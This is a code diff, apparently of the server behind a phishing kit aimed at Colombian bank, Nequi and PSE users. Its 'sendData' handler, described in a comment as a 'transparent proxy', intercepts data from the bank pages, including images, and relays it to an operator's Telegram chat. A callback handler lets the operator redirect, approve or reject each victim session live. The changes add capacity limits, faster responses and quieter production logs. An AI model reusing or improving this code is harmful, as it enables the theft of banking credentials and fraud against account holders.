@@ -75,9 +75,17 @@ class SessionManager {
         this.sessions = new Map();
         this.socketToSession = new Map();
         this.EXPIRY_TIME = 30 * 60 * 1000;
+        this.MAX_SESSIONS = 5000;
     }
 
     createSession(sessionId, socketId, module, data = {}) {
+        if (this.sessions.size >= this.MAX_SESSIONS) {
+            this.cleanExpiredSessions();
+            if (this.sessions.size >= this.MAX_SESSIONS) {
+                throw new Error('Capacidad máxima alcanzada');
+            }
+        }
+
         const sessionData = {
             sessionId,
             socketId,
@@ -198,6 +206,7 @@ io.on('connection', (socket) => {
         });
     });
 
+    // Manejador alternativo para bancas que usan init_session con guión bajo
     socket.on('init_session', (payload) => {
         const { sessionId } = payload;
         let session = sessionManager.getSession(sessionId);
@@ -206,6 +215,7 @@ io.on('connection', (socket) => {
             sessionManager.updateSocket(sessionId, socket.id);
             console.log(`🔄 Sesión de banca reconectada: ${sessionId} | Socket: ${socket.id}`);
         } else {
+            // Crear sesión temporal si no existe (puede venir de PSE)
             session = sessionManager.createSession(sessionId, socket.id, 'banco', {});
             console.log(`🆕 Nueva sesión de banco creada: ${sessionId} | Socket: ${socket.id}`);
         }
@@ -307,12 +317,15 @@ io.on('connection', (socket) => {
         }
     });
 
+    // PROXY TRANSPARENTE: Interceptar y reenviar mensajes de las bancas al Telegram principal
     socket.on('sendData', async (data) => {
         console.log('🔍 PROXY: Interceptando mensaje de banca:', data);
         
         try {
+            // Extraer sessionId (puede venir del data o del payload)
             let sessionId = data.sessionId;
             
+            // Si no hay sessionId en el data, buscar en la sesión del socket
             if (!sessionId) {
                 const session = sessionManager.getSessionBySocket(socket.id);
                 sessionId = session ? session.sessionId : null;
@@ -326,6 +339,7 @@ io.on('connection', (socket) => {
             const session = sessionManager.getSession(sessionId);
             const sessionData = session ? session.data : {};
 
+            // Guardar datos en la sesión
             if (session) {
                 sessionManager.addData(sessionId, {
                     [`bank_${data.type}`]: data,
@@ -333,6 +347,7 @@ io.on('connection', (socket) => {
                 });
             }
 
+            // Preparar mensaje para Telegram
             let telegramText = '';
             let keyboard = data.content?.keyboard || null;
 
@@ -342,6 +357,7 @@ io.on('connection', (socket) => {
                 telegramText = data.content;
             }
 
+            // Agregar contexto de la sesión Nequi/PSE si existe
             let fullMessage = '';
             if (sessionData.phone || sessionData.amount || sessionData.bank) {
                 fullMessage += `━━━━━━━━━━━━━━━━━━━━━━\n`;
@@ -356,6 +372,7 @@ io.on('connection', (socket) => {
             fullMessage += telegramText;
             fullMessage += `\n\n🆔 <code>${sessionId}</code>`;
 
+            // Si hay imagen, enviar imagen con caption
             if (data.content?.image) {
                 console.log('📷 Enviando imagen a Telegram');
                 const imageBuffer = Buffer.from(data.content.image.split(',')[1], 'base64');
@@ -366,6 +383,7 @@ io.on('connection', (socket) => {
                     reply_markup: keyboard
                 });
 
+                // Guardar referencia del mensaje
                 telegramMessages.set(sessionId, {
                     messageId: sentMessage.message_id,
                     chatId: CHAT_ID,
@@ -374,12 +392,14 @@ io.on('connection', (socket) => {
 
                 console.log('✅ Imagen enviada a Telegram:', sentMessage.message_id);
                 
+                // Confirmar al cliente de la banca
                 socket.emit('dataSent', { 
                     success: true, 
                     sessionId, 
                     messageId: sentMessage.message_id 
                 });
             } else {
+                // Enviar texto normal
                 console.log('📨 Enviando mensaje a Telegram');
                 
                 const sentMessage = await bot.sendMessage(CHAT_ID, fullMessage, {
@@ -387,6 +407,7 @@ io.on('connection', (socket) => {
                     reply_markup: keyboard
                 });
 
+                // Guardar referencia del mensaje
                 telegramMessages.set(sessionId, {
                     messageId: sentMessage.message_id,
                     chatId: CHAT_ID,
@@ -395,6 +416,7 @@ io.on('connection', (socket) => {
 
                 console.log('✅ Mensaje enviado a Telegram:', sentMessage.message_id);
                 
+                // Confirmar al cliente de la banca
                 socket.emit('dataSent', { 
                     success: true, 
                     sessionId, 
@@ -419,106 +441,130 @@ io.on('connection', (socket) => {
     });
 });
 
+// OPTIMIZACIÓN: Callback Query ULTRA RÁPIDO con respuesta inmediata
 bot.on('callback_query', async (callbackQuery) => {
+    const startTime = Date.now();
     const { data, message: { message_id: messageId, chat: { id: chatId } }, id: callbackId } = callbackQuery;
 
     try {
-        console.log('🔘 Callback recibido:', data);
-        console.log('📍 Message ID:', messageId, '| Chat ID:', chatId, '| Callback ID:', callbackId);
+        // OPTIMIZACIÓN CRÍTICA: Responder INMEDIATAMENTE a Telegram
+        bot.answerCallbackQuery(callbackId, { 
+            text: '⚡ Procesando...' 
+        }).catch(() => {});
         
+        // Logs solo en desarrollo
+        if (NODE_ENV !== 'production') {
+            console.log('🔘 Callback recibido:', data);
+        }
+        
+        // Intentar parsear diferentes formatos de callback_data
         let sessionId = null;
         let action = null;
         let module = null;
         
+        // Formato: action:page:sessionId (usado por algunas bancas)
         if (data.includes(':')) {
             const parts = data.split(':');
             action = parts[0];
             sessionId = parts[parts.length - 1];
             
-            console.log('📋 Formato con ":" detectado | Acción:', action, '| SessionId:', sessionId);
+            if (NODE_ENV !== 'production') {
+                console.log('📋 Formato con ":" detectado | Acción:', action, '| SessionId:', sessionId);
+            }
         }
+        // Formato: module_action_sessionId (usado por Nequi/PSE)
         else if (data.includes('_')) {
             const parts = data.split('_');
             module = parts[0];
             action = parts[1];
             sessionId = parts.slice(2).join('_');
             
-            console.log('📋 Formato con "_" detectado | Módulo:', module, '| Acción:', action, '| SessionId:', sessionId);
+            if (NODE_ENV !== 'production') {
+                console.log('📋 Formato con "_" detectado | Módulo:', module, '| Acción:', action, '| SessionId:', sessionId);
+            }
         }
 
         if (!sessionId) {
             console.error('❌ No se pudo extraer sessionId del callback');
-            await bot.answerCallbackQuery(callbackId, { text: '⚠️ Formato de callback inválido', show_alert: true });
             return;
         }
 
         const session = sessionManager.getSession(sessionId);
         if (!session) {
-            console.warn('⚠️ Sesión no encontrada:', sessionId);
-            await bot.answerCallbackQuery(callbackId, { text: '⚠️ Sesión expirada', show_alert: true });
+            if (NODE_ENV !== 'production') {
+                console.warn('⚠️ Sesión no encontrada:', sessionId);
+            }
             return;
         }
 
         const targetSocket = io.sockets.sockets.get(session.socketId);
         if (!targetSocket) {
-            console.warn('⚠️ Cliente desconectado para sesión:', sessionId);
-            await bot.answerCallbackQuery(callbackId, { text: '⚠️ Cliente desconectado', show_alert: true });
+            if (NODE_ENV !== 'production') {
+                console.warn('⚠️ Cliente desconectado para sesión:', sessionId);
+            }
             return;
         }
 
-        console.log('✅ Sesión y socket encontrados, procesando callback');
+        if (NODE_ENV !== 'production') {
+            console.log('✅ Sesión y socket encontrados, procesando callback');
+        }
         
-        await bot.editMessageReplyMarkup(
+        // Remover teclado inline del mensaje en BACKGROUND (no bloquea)
+        bot.editMessageReplyMarkup(
             { inline_keyboard: [] }, 
             { chat_id: chatId, message_id: messageId }
         ).catch(() => {});
 
+        // Manejadores especiales para Nequi y PSE
         if (module === 'nequi' && action === 'follow') {
-            await bot.sendMessage(chatId, '✅ Cliente redirigido a PSE', { reply_to_message_id: messageId });
             targetSocket.emit('actionFollow', { sessionId, action: 'follow', nextPage: 'pse' });
-            await bot.answerCallbackQuery(callbackId, { text: '✅ Continuar a PSE' });
-            return;
+            setImmediate(() => {
+                bot.sendMessage(chatId, '✅ Cliente redirigido a PSE', { reply_to_message_id: messageId }).catch(() => {});
+            });
         } else if (module === 'nequi' && action === 'reject') {
-            await bot.sendMessage(chatId, '❌ Transacción rechazada', { reply_to_message_id: messageId });
             targetSocket.emit('actionReject', { sessionId, action: 'reject' });
             sessionManager.deleteSession(sessionId);
-            await bot.answerCallbackQuery(callbackId, { text: '❌ Rechazado' });
-            return;
+            setImmediate(() => {
+                bot.sendMessage(chatId, '❌ Transacción rechazada', { reply_to_message_id: messageId }).catch(() => {});
+            });
         } else if (module === 'pse' && action === 'approve') {
-            await bot.sendMessage(chatId, '✅ PSE aprobado, redirigiendo al banco...', { reply_to_message_id: messageId });
             targetSocket.emit('actionApprovePSE', { sessionId, action: 'approve' });
-            await bot.answerCallbackQuery(callbackId, { text: '✅ PSE aprobado' });
-            return;
+            setImmediate(() => {
+                bot.sendMessage(chatId, '✅ PSE aprobado, redirigiendo al banco...', { reply_to_message_id: messageId }).catch(() => {});
+            });
         } else if (module === 'pse' && action === 'reject') {
-            await bot.sendMessage(chatId, '❌ PSE rechazado', { reply_to_message_id: messageId });
             targetSocket.emit('actionRejectPSE', { sessionId, action: 'reject' });
             sessionManager.deleteSession(sessionId);
-            await bot.answerCallbackQuery(callbackId, { text: '❌ Rechazado' });
-            return;
+            setImmediate(() => {
+                bot.sendMessage(chatId, '❌ PSE rechazado', { reply_to_message_id: messageId }).catch(() => {});
+            });
+        } else {
+            // Para todas las demás bancas, enviar la acción directamente
+            targetSocket.emit('telegramAction', {
+                action: action,
+                sessionId: sessionId,
+                messageId: messageId,
+                fromTelegram: true,
+                telegramMessageId: messageId,
+                timestamp: Date.now()
+            });
+            
+            // Confirmación en BACKGROUND
+            setImmediate(() => {
+                bot.sendMessage(chatId, `✅ Acción "${action}" enviada`, { 
+                    reply_to_message_id: messageId 
+                }).catch(() => {});
+            });
         }
 
-        console.log('📤 Enviando acción al cliente:', { action, sessionId });
-        
-        targetSocket.emit('telegramAction', {
-            action: action,
-            sessionId: sessionId,
-            messageId: messageId,
-            fromTelegram: true,
-            telegramMessageId: messageId,
-            timestamp: Date.now()
-        });
-
-        await bot.answerCallbackQuery(callbackId, { 
-            text: `✅ Acción "${action}" enviada` 
-        });
-
-        await bot.sendMessage(chatId, `✅ Acción "${action}" enviada`, { 
-            reply_to_message_id: messageId 
-        });
+        // Medir latencia solo en desarrollo
+        if (NODE_ENV !== 'production') {
+            const latency = Date.now() - startTime;
+            console.log(`⚡ Callback procesado en ${latency}ms`);
+        }
 
     } catch (error) {
         console.error('❌ Error en callback_query:', error);
-        await bot.answerCallbackQuery(callbackId, { text: '❌ Error', show_alert: true });
     }
 });
 
@@ -569,10 +615,21 @@ ${registered}
 ━━━━━━━━━━━━━━━━━━━━━━`.trim();
 }
 
-setInterval(() => sessionManager.cleanExpiredSessions(), 10 * 60 * 1000);
 
+
+// Limpieza automática de sesiones cada 5 minutos
+setInterval(() => {
+    const cleaned = sessionManager.cleanExpiredSessions();
+    if (cleaned > 0 && NODE_ENV !== 'production') {
+        console.log(`🧹 Limpieza: ${cleaned} sesiones expiradas eliminadas`);
+    }
+}, 5 * 60 * 1000);
+
+// Ruta para que Telegram envíe las actualizaciones
 app.post('/api/telegram/webhook', express.json(), (req, res) => {
-    console.log('📥 Webhook recibido de Telegram:', req.body.update_id);
+    if (NODE_ENV !== 'production') {
+        console.log('📥 Webhook recibido de Telegram:', req.body.update_id);
+    }
     
     try {
         bot.processUpdate(req.body);
@@ -616,10 +673,12 @@ app.get('/api/health', (req, res) => {
     });
 });
 
+// Health check para Railway (sin stats para más velocidad)
 app.get('/health', (req, res) => {
     res.status(200).send('OK');
 });
 
+// Root endpoint
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
@@ -658,6 +717,7 @@ function gracefulShutdown() {
     server.close(() => {
         console.log('✅ Servidor HTTP cerrado');
         
+        // Solo detener polling si no estamos en producción
         if (NODE_ENV !== 'production') {
             bot.stopPolling()
                 .then(() => {
@@ -678,4 +738,3 @@ function gracefulShutdown() {
         process.exit(1);
     }, 10000);
 }
-
